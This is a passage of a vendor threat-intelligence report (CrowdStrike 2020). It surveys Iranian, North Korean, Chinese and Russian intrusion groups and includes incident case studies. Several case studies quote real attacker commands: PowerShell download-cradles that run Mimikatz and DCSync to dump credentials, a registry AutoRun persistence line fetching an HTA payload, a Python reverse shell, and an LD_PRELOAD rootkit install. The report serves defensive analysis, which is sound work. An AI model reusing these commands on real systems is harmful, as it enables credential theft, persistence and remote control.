COBALT SPIDER’S VARIATIONS IN DELIVERY METHODS In 2019, COBALT SPIDER remained focused almost exclusively on the financial sector. This group has used a diverse variety of dropper files to deliver the COBINT backdoor. These droppers have included: Gemini and Leo macro documents; Virgo exploit documents; Word documents containing OLE objects; Cancer JavaScripts; NSIS files; backdoored versions of legitimate web browser updates; and LNK files. In addition to regularly impersonating banks, COBALT SPIDER has repeatedly used social engineering lures related to SWIFT (Society for Worldwide Interbank Financial Telecommunication) and the European Central Bank (ECB). The adversary has also employed infrastructure impersonating the ECB. It is probable that COBALT SPIDER is also expanding its targeting scope beyond European and North American financial institutions to include Central and South America. CrowdStrike Intelligence observed efforts to more selectively target victims in October 2019, when GRACEFUL SPIDER introduced victim IP address geolocation filtering. In 2020, targeted eCrime groups will almost certainly continue to directly conduct operations against financial institutions and other companies.

CrowdStrike Intelligence assesses with moderate confidence that in 2020, targeted eCrime groups will likely increase campaigns against victims outside of Europe and the United States. COBALT SPIDER will likely continue to develop or obtain a diverse range of first-stage malware for use in COBINT campaigns. CrowdStrike tracks numerous targeted intrusion adversaries based around the world. Activity in this section highlights significant events attributed to actor groups from China, Iran, Russia, DPRK, India, Pakistan and Vietnam. Targeted intrusion activity in 2019 featured high-volume operations from DPRK-associated adversaries, especially VELVET CHOLLIMA and LABYRINTH CHOLLIMA. Chinese adversary activity was particularly elevated against telecommunication entities. Multiple Russian adversaries, including PRIMITIVE BEAR and FANCY BEAR, were linked to the targeting of Ukraine. Amid a year of rising tension between Iran and the U.S., Iranian adversary activity included campaigns using job and recruitment themes spoofing a U.S.-based defense contractor, suggesting an increasing focus on government and defense sector targeting.

Reported targeted intrusion activity in 2019 was evenly distributed across incidents linked to Russian, Iranian and North Korean adversaries: BEAR - 22% KITTEN - 21% CHOLLIMA - 18% PANDA - 15% LEOPARD/TIGER (Indian subcontinent) - 14% Figure 11 shows the relatively high operational pace of VELVET CHOLLIMA, LABYRINTH CHOLLIMA and PRIMITIVE BEAR. TARGETED INTRUSION Targeted intrusion activity in 2019 featured high-volume operations from DPRK-associated adversaries, especially VELVET CHOLLIMA and LABYRINTH CHOLLIMA. CROWDSTRIKE GLOBAL THREAT REPORT 2020 39 Figure 11. Targeted Intrusions by Adversary in 2019 As noted in the China section later in this report, activity with suspected ties to the People’s Republic of China is much more prevalent than what could be attributed to individual named adversaries. Both attributed and suspected Chinese activity contributed to the telecommunications targeting noted in Figure 12. Figure 12. Targeted Intrusions by Victim Sector in 2019 Government Telecommunications Financial Services Academic Media Oil and Gas Computer Gaming Healthcare Energy Think Tanks Military Chemical Logistics Technology Political Extractive Industrial Professional Services Petrochemical Aerospace Aviation Maritime Defense Cryptocurrency Automotive Dissident Manufacturing NGO TARGETED INTRUSIONS BYVICTIMSECTOR TARGETED  INTRUSIONS BY ADVERSARY COZY BEAR KRYPTONITE PANDA STONE PANDA REMIX KITTEN CHARMING KITTEN QUILTED TIGER HELIX KITTEN PIRATE PANDA SILENT CHOLLIMA LOTUS PANDA MUSTANG PANDA EMISSARY PANDA RICOCHET CHOLLIMA IMPERIAL KITTEN VICEROY TIGER OCEAN BUFFALO BERSERK BEAR STARDUST CHOLLIMA VENOMOUS BEAR WICKED PANDA FANCY BEAR STATIC KITTEN REFINED KITTEN PRIMITIVE BEAR MYTHIC LEOPARD LABYRINTH CHOLLIMA VELVET CHOLLIMA CROWDSTRIKE GLOBAL THREAT REPORT 2020 40 IRAN Iranian state-nexus targeted intrusion activity in 2019 was broadly consistent in tempo and targeting, despite several key events that appeared to cause limited gaps in the operations of specific adversaries.

These disruptions included a range of purported hacktivist leaks on the activity, tools and personnel of three separate state-nexus adversaries, as well as industry and government publications identifying that one of those adversaries previously had been compromised by a Russian state-nexus adversary. Following these disruptive incidents, tracked adversaries responded in a variety of ways, including adopting changes in TTPs, scaling back activity or continuing to operate with largely unchanged behavior. Notable changes in TTPs included an increased reliance on social media for reconnaissance and initial payload delivery, use of employment-themed lure content and a greater attention to operational security in the crafting of payloads and structure of malware C2 channels. While activity earlier in the year focused on countries in the Middle East and North Africa (MENA) region, the latter half of 2019 saw a pronounced shift in targeting toward entities in the U.S., likely in response to an extended spike in tension between Iran and the U.S.

over events in the Persian Gulf that began in May 2019. Other relevant incidents included a domestic internet shutdown in Iran beginning in November 2019 in response to a large-scale outbreak of protests across the country following a government decision to increase the price of fuel. This was accompanied by allegations of a widespread campaign by the regime targeting protesters, journalists and dissidents across social media and encrypted messaging platforms. Industry reporting described Iran’s continuing deployment of destructive malware, namely wipers, against specific entities in the Middle East region. However, these activities appeared to be limited in scale compared to past Iran-nexus destructive operations utilizing the Shamoon wiper, and they could not be attributed to Iran with the same confidence or detail as past destructive activities. Following these disruptive incidents, tracked adversaries responded in a variety of ways, including adopting changes in TTPs, scaling back activity or continuing to operate with largely unchanged behavior.

CROWDSTRIKE GLOBAL THREAT REPORT 2020 41 ACTIVE ADVERSARIES Adversary Ops Tempo Description REFINED KITTEN MediumHigh In June 2019, REFINED KITTEN conducted a brief but high-tempo campaign, likely in relation to ongoing tensions between Iran and the United States. Throughout the latter half of 2019, the adversary used spoofed job postings with defense contractor themes to deliver open-source post-exploitation tools. IMPERIAL KITTEN has maintained a consistent operational tempo since Q2 2019. Its operations primarily utilize recruitment- and job-themed infrastructure to deliver custom tooling. CHARMING KITTEN has been linked to ongoing credential collection operations, featuring the use of spoofed login-related websites. Additional suspected malicious domains spoofed Iran-focused civil society groups, scientific research organizations and online educational platforms. Following a series of leaks, observed HELIX KITTEN activity dropped. The adversary resumed at least a portion of its operations in June 2019, although with changes in its operational behavior. Consistent with its past behavior, STATIC KITTEN was observed regularly modifying its operational behavior and tooling during Spring 2019.

Despite being targeted in a limited leak of materials related to its operations, the adversary remained active at a lower operational tempo. It was also observed expanding its targeting to include the energy sector. Publicly reported as “Chafer” and “APT39,” REMIX KITTEN maintained an exceptionally low operational tempo throughout 2019, possibly as a result of being the target of an extended leak relating to its operations, capabilities and personnel. Table 6. Summary of Activity Attributed to Iranian Adversaries IRAN_  Overview In Fall 2019, Falcon OverWatch observed a targeted intrusion in which the victim, who had initially deployed the CrowdStrike Falcon platform to a limited endpoint estate, was notified by the OverWatch team about a potential intrusion that predated the installation of the Falcon sensor. This activity included an unidentified actor remotely accessing the network with valid credentials, harvesting credentials, performing host and network reconnaissance and utilizing web shells to establish persistence.

The deployed web shell was a variant identified in industry reporting as IntrudingDivisor. CrowdStrike Intelligence attributes this activity and IntrudingDivisor to the Iranian state-nexus adversary HELIX KITTEN with high confidence. The adversary used a combination of built-in operating system utilities, publicly available software and custom-built tools to execute malicious activities on the network. Throughout the intrusion, the OverWatch team noted the extensive use of RDP, rundll32, certutil, a command-line tool used to display user and group information, and custom web shells used for reconnaissance, lateral movement and execution of tasks. Initial Observations Threat hunting initially uncovered malicious activity when hunters observed the adversary establish an RDP session and proceed to harvest credentials by dumping the memory of the LSASS process with built-in Task Manager. The actor also deployed a simple encoded command-line Active Directory (AD) scanner to display user and group information. The scanner’s file extension was saved as C:\Temp\[REDACTED]\1.txt and was decoded via certutil as follows prior to execution: certutil.exe -decode 1.txt l.exe The AD scanner was then executed in the following format: l.exe administrators \\[REDACTED IP ADDRESS] Furthermore, OverWatch identified that the adversary used the combination of valid credentials and RDP to install the IntrudingDivisor web shell to three mail servers.

HELIX KITTEN INTRUSION OVERWATCH FEATURE_ IRAN_  Notable Adversary Behavior During the course of its operation, the adversary deployed a web shell with the filename logoff.aspx and subsequently logged into that web shell from an external address. Technical analysis of the web shell identified it as a variant of a tool previously identified in industry reporting as IntrudingDivisor. IntrudingDivisor is a multifunction web shell that relies on specific numeric inputs to execute arbitrary commands, write data to a specified file, alter access times of a specified file and read a specified file. The tool’s industry moniker is based on its use of a specific division-based system of numeric inputs for actor authentication and command execution. Conclusions and Recommendations The web shell identified during the intrusion largely conforms with the industry reporting, but it does exhibit some notable differences. For instance, the sample identified in this intrusion does not automatically log the time, the client IP address or the user agent string, as discussed in industry reports.

Despite the difference in logging functionality, this sample uses some of the same code to perform the same functionality and employs the same hard-coded constants for authentication/command execution as other versions of IntrudingDivisor. Industry reporting describes IntrudingDivisor as often deployed in concert with the TwoFace web shell, which CrowdStrike Intelligence attributes to the Iranian statenexus adversary HELIX KITTEN. Mitigation steps to defend against threats from this intrusion include monitoring for unexpected processes interacting with LSASS. Given the fact that the adversary was using valid credentials over RDP, defenders should also continuously monitor for unusual account behavior. In regard to the web shell activity, employ process monitoring on web servers to identify suspicious actions or file access. Defenders should also review authentication logs and any unexpected traffic on the server  LOOKING FORWARD CrowdStrike Intelligence assesses with high confidence that Iranian adversaries will continue to use cyber espionage to support traditional intelligence collection from a variety of public and private entities, with a particular emphasis on the MENA region and North America.

The primary focus of this activity is likely to be driven by both strategic and directed intelligence requirements related to furthering Iran’s geostrategic goals, counteracting the effects of economic sanctions and maintaining the stability of the regime. The latter requirements will almost certainly include continued targeting of figures critical of the regime, both within Iran and abroad, particularly dissidents and journalists, and may extend to disinformation campaigns utilizing social media, similar to activity against American audiences during 2019 that was reported to have an Iranian nexus. Based on activity observed in 2019, Iranian cyber espionage appears to be increasingly tasked to support gaps in military-related intelligence requirements and achieve positional access to enable the compromise of third parties. With that in mind, defense, maritime, telecommunications and information technology organizations in the MENA region will likely be of particular interest to Iranian adversaries in 2020. Domestically, recent protests across the country and the run-up to elections in February 2020 have exposed significant political fissures within the Iranian body politic.

As a result, it is likely that the regime will attempt to strengthen its dominance over the information space available to its citizens, including through further development of its national intranet and more intense targeting of internal opposition figures, dissidents abroad and certain established political elements. Based on activity observed in 2019, Iranian cyber espionage appears to be increasingly tasked to support gaps in military-related intelligence requirements and achieve positional access to enable the compromise of third parties. DPRK-based targeted intrusions represent some of the most active operations in 2019. Both VELVET CHOLLIMA and LABYRINTH CHOLLIMA sustained an elevated operational pace throughout the year. This tempo was not only represented by multiple observed campaigns but also by sustained development of tools and techniques. In the case of LABYRINTH CHOLLIMA, the adversary demonstrated the ability to compromise multiple platforms and operating systems, including Windows, Linux, macOS and Android. Entities within the Republic of Korea (ROK, or South Korea) continued to be of strategic interest, particularly for RICOCHET CHOLLIMA, VELVET CHOLLIMA and LABYRINTH CHOLLIMA.

However, VELVET CHOLLIMA also targeted the U.S. and Japan through intelligence-gathering operations focused on collecting information on nuclear and sanctions issues. Multiple incidents targeted India, with some activity further supporting the assessment that the DPRK is conducting economic espionage against key industries. Financial sector targeting is believed to be worldwide. Not all Korea-based activity identified in 2019 could be affirmatively attributed to a named DPRK adversary. In July 2019, Falcon OverWatch identified a NOKKI malware sample, which precipitated detailed technical analysis of this malware. Despite previous links to the ROK-based SHADOW CRANE, this technical analysis led to the assessment that the malware was likely an adversary with a nexus to the DPRK regime, with at least some relationship to VELVET CHOLLIMA. A Chrome zero-day vulnerability (CVE-2019-13720) that was reported in November 2019 posed the same problem for attribution. TTPs associated with this activity were observed from both SHADOW CRANE and RICOCHET CHOLLIMA, and both of these adversaries are suspected of having a similar target scope that includes journalists and academics involved in Korean policy.

DPRK_ACTIVE ADVERSARIES Adversary Ops Tempo Description  The fast-paced operations attributed to VELVET CHOLLIMA observed in late 2018 continued through 2019. Throughout the year, CrowdStrike Intelligence identified evidence suggesting that this adversary is engaging in currency-generation operations through its targeting of cryptocurrency users and/or exchanges. LABYRINTH CHOLLIMA introduced a steady stream of new tools in 2019, suggesting that this adversary is in a constant state of development. RICOCHET  RICOCHET CHOLLIMA targeted likely defectors from DPRK and/or organizations in the ROK associated with assisting defectors, although additional evidence has suggested its targeting can be much broader in scope. STARDUST CHOLLIMA activity in April and May 2019 targeted financial institutions in a continuation of operations observed in 2018. This adversary is possibly supported by HUMINT operations, with reports of actors using social engineering techniques over the phone. Reporting of SILENT CHOLLIMA’s 2019 activity revealed a recent focus on targeting financial and energy sector entities in India.

Summary of Activity Attributed to North Korean Adversaries in 2019  SECTOR HIGHLIGHT: FINANCE AND CRYPTOCURRENCY As in 2018, CrowdStrike Intelligence once again observed North Korean targeting of the finance and cryptocurrency sectors in 2019. The extent of this targeting includes activity from all named DPRK-affiliated adversaries — from STARDUST CHOLLIMA’s breach of payment processors to smallerscale cryptocurrency theft in VELVET CHOLLIMA’s deployment of GoldStamp malware. LABYRINTH CHOLLIMA sustained routine operations against cryptocurrency exchanges, and recent reporting detailed SILENT CHOLLIMA’s use of DTrack malware to compromise ATMs in India. Prior to 2019, RICOCHET CHOLLIMA was not reported as conducting intrusions against this sector. However, in mid-May 2019, open sources reported that RICOCHET CHOLLIMA used a variant of Nimbus malware against suspected financial entities in Vietnam, Hong Kong, Russia and DPRK in late 2018. While it is unclear if this operation represented an attempt at theft of funds, this activity, if accurate, would represent a significant expansion in the adversary’s known target scope.

Taken together, these operations strongly suggest that all DPRK groups represent some level of threat to the financial sector. Not only are these adversaries engaging in small-scale currency generation activity, which likely funds their own operations, they are also possibly contributing to DPRK’s ability to evade international sanctions and finance its foreign and domestic policy initiatives. In addition to supporting currency generation, LABYRINTH CHOLLIMA’s targeting of cryptocurrency exchanges could support espionage-oriented efforts designed to collect information on users or cryptocurrency operations and systems. DPRK has been developing its own cryptocurrency to further circumvent sanctions. Similarly, RICOCHET CHOLLIMA’s targeting of financial entities could also represent efforts designed to obtain information on the finances of a person or organization of interest to DPRK’s intelligence services. Overview The OverWatch team observed multiple spear-phishing attacks against targets to deploy the CHOLLIMA-associated malware known as BabyShark. According to CrowdStrike Intelligence, VELVET CHOLLIMA has been employing BabyShark since at least August 2018.

Delivery is typically via phishing messages with Microsoft Office document attachments containing a macro to download a BabyShark HTML Application (HTA) file, though Windows executables have also been observed. Initial Observations In one such intrusion in early 2019, OverWatch identified requests to download a BabyShark HTA file from a compromised (otherwise legitimate) domain. The resulting file ultimately downloaded an encoded VBScript, which was used to attempt further tasking and downloading of additional tools from the compromised domain. The activity also included launching the TeamViewer Portable application. OverWatch’s quick identification of the threat allowed defenders to take action before the adversary was able to perform interactive command execution. In mid-2019, VELVET CHOLLIMA conducted another intrusion. The targeted user received a highly tailored spear-phishing email with a malicious decoy Word document attachment. The first-stage payload was retrieved with a file name of Drfwj0.hta via mshta.exe from the actor-controlled domain https://bit-albania[.]com. Notable Adversary Behavior Analysis of Drfwj0.hta found it to be an executable HTA file written in VBScript that acted as a BabyShark downloader.

It downloaded and decoded another payload using a custom decoding algorithm from the same domain (https://bitalbania[.]com). CROWDSTRIKE GLOBAL THREAT REPORT 2020 49 OVERWATCH FEATURE_ This payload decoded to a VBScript, which was Stage 1 of the VELVET CHOLLIMA BabyShark implant. The script also configured a persistence mechanism by setting an autorun key to download and execute the second-stage HTA downloader whenever cmd.exe is run: reg add "HKEY_CURRENT_USER\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "powershell.exe start-process -windowstyle hidden -filepath mshta.exe https://bit-albania[.] com/[REDACTED]/Drfwj.hta" /f The script then modified registry settings associated with Microsoft Office to suppress VBA warnings regarding macros, doing so by forcing the creation of the same associated Registry value for three different versions of MS Word. Rather than first checking which version of MS Office was installed, the script ran registry modification commands for multiple versions to ensure the changes took effect. The script also performed basic discovery commands.

Output from the discovery commands was saved to %APPDATA%\Microsoft\ttmp.log before being base64- encoded and uploaded to: https://bit-albania[.]com/BackUps/[REDACTED]/upload.php Finally, the script created scheduled tasks with SYSTEM-level privileges that essentially launch cmd.exe to trigger the persistence mechanism. The second-stage HTA downloader, Drfwj.hta, then retrieved the second stage of the BabyShark implant from: https://bit-albania[.]com/BackUps/[REDACTED]/expres.php?op=2 The second stage was a VBScript that executed more host discovery and checked if the adversary wanted to deploy additional modules. Conclusions and Recommendations Due to the organization’s timely response in containing the host, further malicious activity, including credential dumping or lateral movement, was not observed. Like many other targeted adversaries, VELVET CHOLLIMA often employs similar spear-phishing techniques to socially engineer its intended victims. Therefore, user awareness and education are essential to limit vulnerability to customized phishing lures. In addition, robust monitoring, detection and threat hunting are vital to ensuring an effective network defense posture. DPRK_ LOOKING FORWARD On December 27, 2019, a judge in the U.S.

District Court for the Eastern District of Virginia unsealed a civil case filed against two John Does associated with VELVET CHOLLIMA. This action resulted in the seizure of about 50 domains used by VELVET CHOLLIMA to conduct web-based credential harvesting and to use as C2 for the custom tools GoldGrabber and BabyShark. Concurrently, the closing months of 2019 saw a reduction in the number of BabyShark operations observed by CrowdStrike Intelligence. That said, previous legal actions against DPRK adversaries have done little to slow their operations, and CrowdStrike Intelligence expects VELVET CHOLLIMA to continue targeting government, nongovernmental organizations (NGOs) and academic entities working on nuclear nonproliferation issues. This target scope is particularly relevant considering that diplomatic relations between DPRK and the U.S. cooled over the course of 2019. As the year-end deadline for nuclear negotiations approached in December, North Korea accused the U.S. of dragging its feet, and then announced it would no longer be bound by limitations on its weapons testing.

While disruptive cyber activity against the U.S. has not been observed, a return to harsher rhetoric only further supports the assessment that DPRK-affiliated adversaries will continue at the current pace of operations. Because sanctions relief is unlikely, these operations will very likely include further targeting of the financial sector, particularly cryptocurrency exchanges, as cryptocurrency can be used outside of conventional banking platforms. There may also be a return to more military-based targeting if tensions escalate in 2020. DPRK_ While disruptive cyber activity against the U.S. has not been observed, a return to harsher rhetoric only further supports the assessment that DPRK-affiliated adversaries will continue at the current pace of operations. CROWDSTRIKE GLOBAL THREAT REPORT 2020 51 Chinese adversary activity was steady throughout 2019, with a prominent focus on the telecommunications sector. Healthcare entities were also included, providing further evidence that Chinese targeted intrusions are enabling corporate espionage of information vital to bolstering these key industries domestically.

China also continued to target the government and defense sectors of regional neighbors, with a concentrated focus on Southeast Asia late in the year. Both CrowdStrike Intelligence analysis and multiple public reports revealed malicious cyber activity targeting minority populations, such as Tibetans and Uyghurs. China also used computer network operations designed to impede the citizen protests in Hong Kong that occurred in the latter half of 2019. The range of these activities runs the gamut from use of iOS exploits and strategic web compromises (SWCs), to distributed denial of service (DDoS) attacks and influence operations. The majority of observed activity has been attributed to adversaries that CrowdStrike Intelligence has assessed to be supporting or working for China’s Ministry of State Security (MSS). CrowdStrike identified numerous active WICKED PANDA infections in the first half of the year, then additional new malware samples in Q3 and Q4 2019, even after industry reporting detailed WICKED PANDA (aka APT 41) operations.

Activity attributed to WICKED PANDA and a possible CIRCUIT PANDA operation included supply chain compromises, demonstrating China’s continued use of this tactic to identify and infect multiple victims. Additional evidence has indicated that some older named adversaries have reemerged; these include PIRATE PANDA and STALKER PANDA, both of which were unobserved in 2018. It is suspected that actors associated with the People’s Liberation Army (PLA) remain active, although CrowdStrike Intelligence’s current visibility into their targeting and TTPs is limited. LOTUS PANDA is associated with the PLA Strategic Support Force (PLASSF) at low confidence, and the return of hibernating adversaries like STALKER PANDA and PIRATE PANDA — neither of which have been associated with MSS — may herald a resurgence of more PLA-aligned actors. Several unnamed but suspected Chinese activities were identified, but due to the use of publicly available toolsets, attribution remains undetermined. This activity underscores how China’s use of open-source and LOTL TTPs continues to be a highly effective means of inhibiting analysis and remediation efforts.

Continuing the high-volume operations observed in 2018, WICKED PANDA was linked to multiple compromises in 2019, including suspected ties to supply chain compromises. This adversary targeted a wide variety of sectors, including telecommunications, technology, gaming, hospitality, utilities and pharmaceutical. MUSTANG PANDA was consistently active, starting in March and continuing through the end of 2019. Observed activity indicates targets are likely in or related to Vietnam, Myanmar, Mongolia and Pakistan. EMISSARY PANDA used custom and commodity malware against healthcare and telecommunication sector targets throughout 2019. Numerous incidents suggested that the Middle East is a specific target region for this actor. CrowdStrike Intelligence identified new PIRATE PANDA activity that showed the adversary began to use the 8.t exploit document builder to target Mongolia from March to April, and then again in November against Vietnam. CrowdStrike identified two compromises linked to LOTUS PANDA at telecommunication companies in Asia. This targeting is consistent with public reporting on an adversary known as Thrip.

JUDGMENT PANDA targeted a range of industries, including research centers for defense and biotechnology. Sources confirmed this adversary also targeted a manufacturing sector organization. Activity against petrochemical and industrial manufacturing entities in East Asia was attributed with moderate confidence to STALKER PANDA in early 2019. A similar intrusion was identified in June. Incidents consistent with previously observed KRYPTONITE PANDA activity were identified targeting Malaysia in October and November 2019. Based on public reporting, a backdoor installed via legitimate ASUS Cloud WebStorage update client software was closely related to CIRCUIT PANDA’s FakeDead malware. Table 8. Summary of Activity Attributed to Chinese Adversaries in 2019 CHINA_ WICKED PANDA INTRUSIONS OVERWATCH FEATURE_ Overview In early 2019, the Falcon OverWatch team observed increased WICKED PANDA activity across various verticals, including the hospitality, technology, telecommunications and gaming industries. These intrusions exhibited a high operational tempo, a plethora of attack techniques and a custom toolkit developed to support stealthy intrusion operations on Windows- and Linuxbased systems.

Initial Observations During one WICKED PANDA intrusion, OverWatch identified extensive use of LOTL techniques. The threat actor accessed a domain controller, via RDP, using previously acquired credentials and performing initial host reconnaissance followed by installation of a malicious implant and credential theft. As the company expanded endpoint visibility into the environment by deploying the CrowdStrike Falcon platform, OverWatch monitoring progressed and the extent of the intrusion became apparent, with evidence of a strong adversary foothold and lateral movement across the network. Notable Adversary Behavior The adversary used the Background Intelligent Transfer Service (BITS) to download and install an implant hosted on a legitimate third-party website. The threat actor renamed the implant as f.exe and copied it to the root directory of the system drive on the compromised domain controller, and subsequently executed the implant with a command-line-supplied password used to decrypt the malicious payload. Once decrypted, as part of the implant’s installation chain, a temporary file was written to the %temp% directory.

In its final stage, the temporary file was executed via rundll32.exe and acted as a loader for the main malicious payload, a variant of the Winnti RAT. Having installed the implant with SYSTEM privileges, the adversary terminated the RDP session, and shortly after, returned to the system through the recently installed malicious implant to harvest credentials with PowerShell Empire cmdlets: CROWDSTRIKE GLOBAL THREAT REPORT 2020 54 OVERWATCH FEATURE_ powershell -ep Bypass -NoP -NonI -NoLogo -W Hidden -c IEX (New-Object Net.WebClient).DopireProjeing('https://raw. githubusercontent.com/EmpireProject/Empire/master/data/ module_source/credentials/Invoke-DCSync.ps1');Invoke-DCSync -PWDumpFormat Note that the command line appears to be corrupted with the DownloadString cmdlet rendered as DopireProjeing, leading to a PowerShell method invocation failure. Immediately after, the threat actor attempted to run the Invoke-Mimikatz cmdlet, this time using a correctly formatted command line and a different repository: powershell "IEX (New-Object Net.WebClient). DownloadString('https://raw.githubusercontent.com/ mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz. ps1'); Invoke-Mimikatz -DumpCreds" Throughout the intrusion, the threat actor continued to execute malicious implants by using a combination of acquired valid credentials and BITS or PowerShell cmdlets to download and execute commands on the local systems.

However, in one instance, OverWatch identified the attempts to use a different technique known as DLL search order hijacking to execute the Winnti RAT. The adversary first copied the implant file to a remote system by using Windows Admin Shares: \[REDACTED]\c$\windows\apphelp.dll It then executed the explorer.exe process that loads apphelp.dll via creation of a scheduled task: schtasks /create /s [REDACTED] /ru "NT Authority\System" /tn [REDACTED] /tr "c:\windows\explorer.exe" /sc once /st 11:37 The malicious implant contained an embedded malicious driver. In order to combat a Windows’ restriction requiring any driver on 64-bit systems to be signed by a Microsoft-verified cryptographic signature, the adversary had signed the driver with a legitimate (most likely stolen) certificate from another company. In a separate WICKED PANDA intrusion, OverWatch observed the adversary deploying its tools, including a user-mode rootkit, on a Linux server. The activity was conducted using a simple Python reverse shell: CHINA_ CROWDSTRIKE GLOBAL THREAT REPORT 2020 55 OVERWATCH FEATURE_ python /tmp/back.py [IP Address REDACTED] 9091 The threat actor downloaded a simple malware loader with an embedded Winnti implant and a customized version of a publicly available user-mode rootkit, which was configured to load via the LD_PRELOAD technique: wget [IP Address REDACTED]:82/libsshd.so sudo ./install cp ./libsshd.so /lib/x86_64-linux-gnu/libsshd.so -chmod 777 /lib/x86_64-linux-gnu/libsshd.so Successful installation of the rootkit adds the following entry of /$LIB/ libsshd.so to the /etc/ld.so.preload file.

This allows the usermode rootkit to load and precede function calls responsible for stealthy operations on a system, such as anti-debugging, hiding files and network connections, remote access and cleaning up authentication log entries. Conclusions and Recommendations Due to WICKED PANDA’s propensity to steal and reuse valid credentials, defenders should actively hunt and monitor for suspicious user, administrator and service account behavior across the network. While LOTL techniques are challenging to defend against, some actions can mitigate the threat. For example, relevant to this case, limit PowerShell’s execution policy as much as is reasonably possible. Also, monitor for execution of rundll32.exe in unusual circumstances or with abnormal arguments. While defending against rootkits is similarly difficult, it is always wise to ensure antivirus software is enabled with proper prevention policies, and continuously hunt for unexpected DLLs and services. CHINA_SECTOR HIGHLIGHT: TELECOMMUNICATIONS Multiple Chinese adversaries — including LOTUS PANDA, WICKED PANDA and EMISSARY PANDA — were linked to the targeting of the telecommunications sector in 2019.

Other incidents, which were notable for the use of publicly available tools, remain unattributed but appear to support China’s efforts against this sector. CrowdStrike Intelligence assesses that China’s interest in targeting this sector has arisen along with a need to target upstream providers to support its traditional and economic espionage goals. The power of telecom data to espionage agencies was illustrated by the malware known as MESSAGETAP, which was reportedly used by WICKED PANDA to monitor short message service (SMS) traffic from telecom networks. MESSAGETAP can collect and store SMS data based on selection criteria, including phone numbers, international mobile subscriber identity (IMSI) numbers and keywords. The ability to collect data based on specific phone numbers and IMSI numbers indicates that the adversary predetermined which individuals to target for collection, possibly identifying phone numbers in previous reconnaissance or collection activities. Incidents from 2019 include multiple compromises of telecom companies in Asia, showing a continued interest in regional neighbors.

While these incidents may also support traditional or economic espionage goals, open-source reporting from September 2019 claimed that some targeted intrusions against telecoms were used by China to track Uyghurs in Central and Southeast Asia. This activity reportedly targeted telecom operators in Turkey, Kazakhstan, India, Thailand and Malaysia — mirroring the observed target scope for tracked Chinese adversaries. Telecom sector targeting — especially in the Central and Southeast Asia regions — would also complement China’s plan to develop a Digital Silk Road. This initiative aims to broaden and deepen digital connections to other nations via the construction of cross-border and submarine optical cables, communication trunks and satellite information passageways, and the development of fifth-generation (5G) mobile networks. Regarding 5G technology specifically, multiple governments (including the United States) have taken note and refused opportunities to work with Huawei, citing concerns over the company’s associations to military and intelligence services in China, Russia and DPRK.

CROWDSTRIKE GLOBAL THREAT REPORT 2020 57 LOOKING FORWARD The publication of WICKED PANDA-associated activities, as well as the IntrusionTruth reporting on KRYPTONITE PANDA (reported in January 2020), may have a cooling effect on the MSS’s reliance on using contract entities in the near-term, but CrowdStrike Intelligence expects a return to operations will occur after tactics are reviewed and updated. Targeting by actor groups associated with the MSS will likely continue to focus on maintaining access to upstream telecom providers, as well as developing new supply chain compromises. CrowdStrike Intelligence anticipates that the first draft of China’s next Five-Year Plan (FYP) will be released in early 2020. This draft is only the first step before a final version is agreed upon in 2021; however, the initial proposal may contain clues about the future priorities of the Chinese Communist Party (CCP) and will help launch planning in numerous CCP agencies. Part of the previous FYP outlined key industries for domestic growth, a vital indication of which sectors are at an increased risk of IP theft.

Despite the U.S.’s request for controls on IP theft and corporate espionage, the targeting of U.S. companies engaged in key industries deemed vital to China’s strategic interests — including clean energy, healthcare, biotechnology, pharmaceuticals and others — is likely to continue. CrowdStrike Intelligence assesses this is likely despite announcements from Washington and Beijing that a limited trade deal may bring an end to the U.S.-China trade war. China’s improving disinformation efforts will continue to have an immediate effect in Hong Kong and Taiwan following their resistance to CCP and support of democratic values throughout 2019 and into 2020. These campaigns will augment China’s robust targeted intrusion resources when dealing with regional neighbors. Western companies are likely to be caught in the middle, between domestic audiences supporting human rights (if only nominally) and pressures from the CCP to bow to censorship. As both Taiwan and Hong Kong are seen by the CCP as “domestic” interference and testing grounds for China-backed cyber operations, they likely foreshadow China’s interest in fomenting unrest and conducting disinformation campaigns on Western democratic elections such as the U.S.

presidential election in November 2020. In 2019, observed Russian computer network operations targeting Ukraine were a predominant feature of targeted intrusions overall. This activity included highvolume PRIMITIVE BEAR activity throughout the year and limited FANCY BEAR spear-phishing campaigns in the fall. These campaigns likely are designed to provide Russian leaders with the information they need to make informed decisions going into diplomatic negotiations, or they may be used tactically by Russia-affiliated forces for battlefield intelligence. CrowdStrike Intelligence continued to conduct technical analysis of VENOMOUS BEAR’s highly sophisticated toolset. Two tools — Facade and Blueprint — are backdoors that act as mail plugins, communicating to a C2 server via specially crafted email attachments. Facade began as an email logger used within VENOMOUS BEAR’s Chinch malware framework, but in 2018, it was used as a fully fledged backdoor. Blueprint operates in a similar fashion but is installed as a Microsoft Exchange transport agent, a legitimate component of Microsoft Exchange Server.

Analysis of the most recent activity attributed to VENOMOUS BEAR indicated that the adversary continues to use the Chinch and Snake malware frameworks, as well as the AesLoader and the Skipper backdoor. CrowdStrike Intelligence continued to conduct technical analysis of VENOMOUS BEAR’s highly sophisticated toolset. ACTIVE ADVERSARIES Adversary Ops Tempo Description  Throughout 2019, CrowdStrike Intelligence observed PRIMITIVE BEAR extensively targeting the Ukrainian government and military sector in high-tempo targeted intrusion operations. CrowdStrike Intelligence has linked likely spearphishing campaigns targeting Belarus, Ukraine and Kazakhstan to FANCY BEAR, although this is likely a subset of the adversary's total activity. FANCY BEAR continues to develop its suite of first-stage tools, which now includes newly observed malware variants dubbed NimbleDown and Zekadero. Evidence identified in 2019, including VENOMOUS BEAR’s compromise of HELIX KITTEN’s infrastructure, has strengthened the assessment that the Middle East and North Africa (MENA) region is within the adversary’s target scope. CrowdStrike Intelligence continues to monitor available sources to determine the extent of BERSERK BEAR’s activity.

CrowdStrike Intelligence is investigating a campaign publicly reported as “Operation Ghost,” which referenced TTPs and tools associated with COZY BEAR. CrowdStrike Intelligence continues to evaluate recent industry reporting on activity possibly attributed to VOODOO BEAR. LOOKING FORWARD Information pertaining to Ukrainian government and military entities is a known standing intelligence objective for numerous Russian intelligence organizations, and the high-volume operations of PRIMITIVE BEAR — as well as the late-2019 focus of FANCY BEAR — are indicative of this mission. As Ukraine and Russia work toward ending a five-year conflict, it is likely that Russia-affiliated intelligence collection operations will continue — if not increase — in the future. On December 9, 2019, the World Anti-Doping Agency (WADA) concluded that the Russian Anti-Doping Agency (RUSADA) was not in compliance with international regulations governing clean participation in sports, and as a result, the Russian government would be banned from participating in or hosting international athletic competitions for four years and face a fine.

